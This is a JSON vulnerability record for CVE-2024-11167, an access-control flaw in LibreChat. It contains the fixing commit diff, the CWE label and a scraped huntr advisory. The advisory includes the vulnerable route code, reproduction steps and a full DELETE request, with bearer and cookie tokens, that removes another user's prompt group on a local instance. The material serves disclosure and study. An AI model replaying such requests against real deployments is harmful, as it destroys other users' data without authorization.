{
    "CVE-2024-11167": {
        "published_date": "2025-03-20T10:09:49.100Z",
        "patch_commits": [
            {
                "url": "https://github.com/danny-avila/librechat/commit/5071bdbf9ac621165f0e8d009818851f3951eee7",
                "content": "fix: invalid access control for deleting prompt groups\n\nFilename: api/models/Prompt.js:\n```\n@@ -92,7 +92,7 @@\nconst createAllGroupsPipeline = (\n \n /**\n  * Get all prompt groups with filters\n- * @param {Object} req\n+ * @param {ServerRequest} req\n  * @param {TPromptGroupsWithFilterRequest} filter\n  * @returns {Promise<PromptGroupListResponse>}\n  */\n\n@@ -142,7 +142,7 @@\nconst getAllPromptGroups = async (req, filter) => {\n \n /**\n  * Get prompt groups with filters\n- * @param {Object} req\n+ * @param {ServerRequest} req\n  * @param {TPromptGroupsWithFilterRequest} filter\n  * @returns {Promise<PromptGroupListResponse>}\n  */\n\n@@ -213,8 +213,34 @@\nconst getPromptGroups = async (req, filter) => {\n   }\n };\n \n+/**\n+ * @param {Object} fields\n+ * @param {string} fields._id\n+ * @param {string} fields.author\n+ * @param {string} fields.role\n+ * @returns {Promise<TDeletePromptGroupResponse>}\n+ */\n+const deletePromptGroup = async ({ _id, author, role }) => {\n+  const query = { _id, author };\n+  const groupQuery = { groupId: new ObjectId(_id), author };\n+  if (role === SystemRoles.ADMIN) {\n+    delete query.author;\n+    delete groupQuery.author;\n+  }\n+  const response = await PromptGroup.deleteOne(query);\n+\n+  if (!response || response.deletedCount === 0) {\n+    throw new Error('Prompt group not found');\n+  }\n+\n+  await Prompt.deleteMany(groupQuery);\n+  await removeGroupFromAllProjects(_id);\n+  return { message: 'Prompt group deleted successfully' };\n+};\n+\n module.exports = {\n   getPromptGroups,\n+  deletePromptGroup,\n   getAllPromptGroups,\n   /**\n    * Create a prompt and its respective group\n\n@@ -510,20 +536,4 @@\nmodule.exports = {\n       return { message: 'Error updating prompt labels' };\n     }\n   },\n-  deletePromptGroup: async (_id) => {\n-    try {\n-      const response = await PromptGroup.deleteOne({ _id });\n-\n-      if (response.deletedCount === 0) {\n-        return { promptGroup: 'Prompt group not found' };\n-      }\n-\n-      await Prompt.deleteMany({ groupId: new ObjectId(_id) });\n-      await removeGroupFromAllProjects(_id);\n-      return { promptGroup: 'Prompt group deleted successfully' };\n-    } catch (error) {\n-      logger.error('Error deleting prompt group', error);\n-      return { message: 'Error deleting prompt group' };\n-    }\n-  },\n };\n```\n\nFilename: api/server/routes/prompts.js:\n```\n@@ -214,7 +214,7 @@\nconst deletePromptController = async (req, res) => {\n     const { promptId } = req.params;\n     const { groupId } = req.query;\n     const author = req.user.id;\n-    const query = { promptId, groupId, author, role: req.user.role };\n+    const query = { promptId, groupId, author };\n     if (req.user.role === SystemRoles.ADMIN) {\n       delete query.author;\n     }\n\n@@ -226,11 +226,24 @@\nconst deletePromptController = async (req, res) => {\n   }\n };\n \n-router.delete('/:promptId', checkPromptCreate, deletePromptController);\n+/**\n+ * Delete a prompt group\n+ * @param {ServerRequest} req\n+ * @param {ServerResponse} res\n+ * @returns {Promise<TDeletePromptGroupResponse>}\n+ */\n+const deletePromptGroupController = async (req, res) => {\n+  try {\n+    const { groupId: _id } = req.params;\n+    const message = await deletePromptGroup({ _id, author: req.user.id, role: req.user.role });\n+    res.send(message);\n+  } catch (error) {\n+    logger.error('Error deleting prompt group', error);\n+    res.status(500).send({ message: 'Error deleting prompt group' });\n+  }\n+};\n \n-router.delete('/groups/:groupId', checkPromptCreate, async (req, res) => {\n-  const { groupId } = req.params;\n-  res.status(200).send(await deletePromptGroup(groupId));\n-});\n+router.delete('/:promptId', checkPromptCreate, deletePromptController);\n+router.delete('/groups/:groupId', checkPromptCreate, deletePromptGroupController);\n \n module.exports = router;\n```"
            }
        ],
        "sw_version": "v0.7.6-rc1",
        "sw_version_wget": "https://github.com/danny-avila/librechat/archive/refs/tags/v0.7.6-rc1.zip",
        "description": "An improper access control vulnerability in danny-avila/librechat versions prior to 0.7.6 allows authenticated users to delete other users' prompts via the groupid parameter. This issue occurs because the endpoint does not verify whether the provided prompt ID belongs to the current user.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/298f5760-5797-4432-8b9e-544609d612c0",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nImproper Access Control Allows deleting other users' reminders in danny-avila/librechat\nValid\nReported on Nov 12th 2024\nDescription\nBecause the report I reported before was exploited on the public, I created a new report to exploit on the local machine The vulnerability allows users to delete other users' prompts on the system via the groupid parameter\nProof of Concept\nconst deletePromptController = async (req, res) => {\n  try {\n    const { promptId } = req.params;\n    const { groupId } = req.query;\n    const author = req.user.id;\n    const query = { promptId, groupId, author, role: req.user.role };\n    if (req.user.role === SystemRoles.ADMIN) {\n      delete query.author;\n    }\n    const result = await deletePrompt(query);\n    res.status(200).send(result);\n  } catch (error) {\n    logger.error(error);\n    res.status(500).send({ error: 'Error deleting prompt' });\n  }\n};\n\nrouter.delete('/:promptId', checkPromptCreate, deletePromptController);\nThis endpoint does not check whether the provided prompts id has the current user's attribute. So it is allowed to delete any prompts\nSTEP TO REPRODUCE\n1 . first create two diffent user account called user-A and user-B\n2 . Then use user A to create new prompts with id 6721b4a6d634c1a37a25bf0e\n3 . Now goto user-B account and sent bellow request to delete the prompts of user-A\nRequest :\nDELETE /api/prompts/groups/6721b4a6d634c1a37a25bf0e HTTP/2 \nHost: localhost.com:3080\nCookie:refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MDdhNjczNWE1NWIyOTI2MjVkYWEyMyIsImlhdCI6MTczMDI2MjE5MSwiZXhwIjoxNzMwODY2MDE2fQ.AbiKd7aoSRrNicejFWHKU0DnZSx3oE6ABUhMYkIbeiU \nSec-Ch-Ua: \"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"\nAccept: application/json, text/plain, / \nAccept-Language: en-US,en;q=0.9 Sec-Ch-Ua-Mobile: ?0 \nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MDdhNjczNWE1NWIyOTI2MjVkYWEyMyIsInVzZXJuYW1lIjoidHJ1bmciLCJwcm92aWRlciI6ImxvY2FsIiwiZW1haWwiOiJ0cnVuZ3B1YmcyNTEweEBnbWFpbC5jb20iLCJpYXQiOjE3MzAyNjIxOTEsImV4cCI6MTczMDI2MzA5MX0.yYzrOo0uZbAfD6YK6y0-QRkmWFPdHoPmnXZcs3wLDSM \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36 \nSec-Ch-Ua-Platform: \"Windows\" \nOrigin: http://localhost.com:3080\nSec-Fetch-Site: same-origin \nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty \nReferer:  http://localhost.com:3080/d/prompts/671f3c74d634c1a37a82bc88 \nAccept-Encoding: gzip, deflate, br \nPriority: u=1, i\nResponse\nHTTP/2 200 OK \nDate: Wed, 30 Oct 2024 04:23:36 GMT \nContent-Type: application/json; charset=utf-8 \nContent-Length: 51 \nAccess-Control-Allow-Origin:  http://localhost.com:3080 \nEtag: W/\"33-8jcPRx4+N5+QxWwFlNBohSpzmoU\" \nVary: Accept-Encoding \nVary: origin, access-control-request-method, access-control-request-headers\nAccess-Control-Allow-Credentials: true\n\n{\"promptGroup\":\"Prompt group deleted successfully\"}\nImpact\nThe vulnerability allows users to delete other users' prompts on the system\nOccurrences\nprompts.js L212-L229\nWe are processing your report and will contact thedanny-avila/librechat team within 24 hours.6 months ago\nBug modified the report6 months ago\nDanny Avila validated this vulnerability6 months ago\nResolved in https://github.com/danny-avila/LibreChat/pull/4705\nI will properly mark it as resolved here when I cut a release.\ntrungg02has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11167assigned to this report.6 months ago\nDanny Avilamarked this as fixedin 0.7.6with commit5071bd6 months ago\nDanny Avilahas been awarded the fix bounty\nprompts.js#L212-L229 has been validated\nWe have sent a warning to the danny-avila/librechat team to inform them that this report will be published in 48 hours3 months ago\nThis vulnerability has now been published3 months ago\nCVE-2024-11167has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11167\n(Published)\nVulnerability Type\nCWE-284: Improper Access Control\nSeverity\nCritical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nv0.7.5\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$900\nFix Bounty\n$225\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The proof of concept and steps to reproduce the vulnerability are provided in the advisory text."
            }
        ],
        "cwe": [
            {
                "id": "CWE-284",
                "value": "CWE-284 Improper Access Control"
            }
        ]
    }
}